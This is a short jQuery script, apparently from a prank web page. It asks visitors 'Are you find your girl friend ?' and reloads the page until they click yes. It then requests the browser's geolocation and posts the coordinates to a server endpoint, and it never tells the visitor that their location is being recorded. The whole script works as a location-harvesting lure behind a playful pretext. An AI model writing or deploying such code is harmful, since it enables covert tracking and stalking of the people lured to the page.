$(document).ready(function(){
    if (confirm('Are you find your girl friend ?') == true) {
        console.log(`you click yes`);
        $("#animation").removeClass('d-none');

        getLocation();
        
      } else {
        location.reload();
        // getLocation
      }


      function getLocation() {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(showPosition);
        } else {
          // alert("Geolocation is not supported by this browser.");
        }
      }
      
      function showPosition(position) {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;
        const coordinates = `lat: ${latitude}, lng: ${longitude}`;
        $.ajax({
          url:LocationStoreUrl,
          method:'POST',
          data:{coordinates:coordinates},
          success: function(res){
            // console.log(`res`,res);
            
          }
        })
        // alert("Latitude: " + latitude + ", Longitude: " + longitude);
      }
});